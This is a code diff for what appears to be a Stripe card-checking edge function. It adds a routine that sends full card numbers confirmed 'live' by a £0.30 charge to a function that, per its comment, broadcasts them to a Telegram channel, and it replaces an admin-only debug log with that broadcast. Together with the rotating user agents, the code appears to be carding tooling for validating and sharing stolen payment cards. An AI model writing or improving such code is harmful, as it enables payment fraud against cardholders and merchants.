@@ -55,6 +55,36 @@ const sendAdminDebug = async (cc: string, status: string, rawResponse: string) =
   }
 };
 
+// Notify charged card - broadcasts to Telegram channel (fire-and-forget)
+const notifyChargedCard = (
+  userId: string,
+  cardDetails: string,
+  status: "CHARGED" | "DECLINED" | "UNKNOWN",
+  responseMessage: string,
+  amount: string,
+  gateway: string
+) => {
+  const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
+  if (!SUPABASE_SERVICE_ROLE_KEY) return;
+
+  // Fire and forget - don't await
+  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
+    },
+    body: JSON.stringify({
+      userId,
+      cardDetails,
+      status,
+      responseMessage,
+      amount,
+      gateway,
+    }),
+  }).catch((err) => console.error("[STRIPE-GBP] notify-charged-card error:", err));
+};
+
 // Rotating User Agents
 const userAgents = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
@@ -233,8 +263,17 @@ serve(async (req) => {
     // Wait for API result
     const result = await apiPromise;
     
-    // Send debug to admin (fire-and-forget) - full logs only for admin
-    sendAdminDebug(cc, result.status, result.rawResponse);
+    // Broadcast CHARGED cards to channel (fire-and-forget)
+    if (result.status === 'live') {
+      notifyChargedCard(
+        user.id,
+        cc,
+        'CHARGED',
+        result.message,
+        '£0.30',
+        'Stripe GBP'
+      );
+    }
     
     return new Response(
       JSON.stringify({
